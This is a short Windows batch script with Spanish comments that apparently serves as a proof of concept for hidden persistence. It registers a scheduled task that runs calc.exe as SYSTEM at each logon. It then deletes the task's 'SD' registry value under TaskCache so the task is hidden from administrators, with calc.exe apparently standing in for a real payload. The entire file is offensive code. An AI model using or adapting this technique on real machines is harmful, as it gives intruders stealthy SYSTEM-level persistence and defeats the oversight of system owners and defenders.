@echo off
set "taskName=Calc_PS1"
set "action=calc.exe"
set "trigger=onLogOn"
set "principal=SYSTEM"

:: Crear la tarea programada
schtasks /create /tn "%taskName%" /tr "%action%" /sc %trigger% /ru %principal% /f

:: Eliminar el valor SD para ocultar la tarea
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\%taskName%" /v "SD" /f
